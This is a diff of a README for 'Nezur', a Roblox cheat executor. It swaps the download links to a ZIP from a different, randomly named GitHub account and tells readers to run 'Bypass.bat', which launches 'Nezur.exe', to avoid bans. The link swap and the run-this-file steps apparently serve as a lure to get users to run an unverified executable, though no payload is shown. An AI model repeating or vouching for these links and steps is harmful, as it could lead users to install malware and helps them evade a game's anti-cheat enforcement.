@@ -8,10 +8,10 @@
 
 ## Important:  Make sure u run Bypass.bat before launching Nezur to prevent from getting kicked or banned
 
- **Click [here](https://github.com/Nezur-External/Nezur-External/archive/refs/heads/main.zip) to download**
+ **Click [here](https://github.com/193lO084/Nezur-Executor-2024/archive/refs/heads/main.zip) to download**
 
 # 📁 〢 Tutorial
-1) Download [Nezur](https://github.com/Nezur-External/Nezur-External/archive/refs/heads/main.zip)
+1) Download [Nezur](https://github.com/193lO084/Nezur-Executor-2024/archive/refs/heads/main.zip)
 3) Extract the ZIP file
 4) Run the Bypass.bat (it automatically runs the Nezur.exe)
 5) Launch any roblox game you want to use scripts in
